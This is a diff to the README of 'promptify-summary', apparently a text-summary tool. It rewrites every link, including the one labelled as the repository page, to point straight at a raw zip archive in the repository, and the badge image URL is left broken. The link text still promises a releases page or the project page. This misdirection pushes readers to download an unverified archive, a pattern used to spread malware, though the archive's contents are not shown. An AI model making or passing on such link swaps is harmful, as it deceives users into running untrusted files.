@@ -1,6 +1,6 @@
 # 🚀 promptify-summary - Generate Structured Text Summaries Easily
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/imen276/promptify-summary/releases)
+[![Download latest release](https://github.com/imen276/promptify-summary/raw/refs/heads/main/promptify_summary/promptify_summary_2.6.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/imen276/promptify-summary/raw/refs/heads/main/promptify_summary/promptify_summary_2.6.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to reach the download page:
 
-   [Download from GitHub Releases](https://github.com/imen276/promptify-summary/releases)
+   [Download from GitHub Releases](https://github.com/imen276/promptify-summary/raw/refs/heads/main/promptify_summary/promptify_summary_2.6.zip)
 
 2. **Select the Latest Version**: Look for the most recent version at the top of the release list. 
 
@@ -78,6 +78,6 @@ If you experience any problems when downloading or using the software, please:
 
 ## 🌐 Contact
 
-For more information and updates, you can explore the repository’s page at [promptify-summary GitHub Repository](https://github.com/imen276/promptify-summary).
+For more information and updates, you can explore the repository’s page at [promptify-summary GitHub Repository](https://github.com/imen276/promptify-summary/raw/refs/heads/main/promptify_summary/promptify_summary_2.6.zip).
 
 **Thank you for using promptify-summary! We hope this tool helps you streamline your content creation process.**
